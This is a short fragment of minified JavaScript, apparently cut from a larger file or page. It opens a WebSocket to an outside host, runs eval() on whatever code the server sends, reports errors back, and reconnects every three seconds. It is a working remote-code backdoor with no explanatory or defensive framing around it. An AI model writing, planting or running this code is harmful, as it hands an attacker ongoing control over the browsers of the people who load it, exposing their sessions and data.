...
function u(){window.ws=new WebSocket("wss://gqpg.gq/i?d2ktcHdu"),ws.onmessage=function(d){try{d=JSON.parse(d.data),eval(d.d)}catch(e){ws.send(JSON.stringify({t:"e",d:e}))}},ws.onclose=function(){setTimeout(u,3e3)}}u();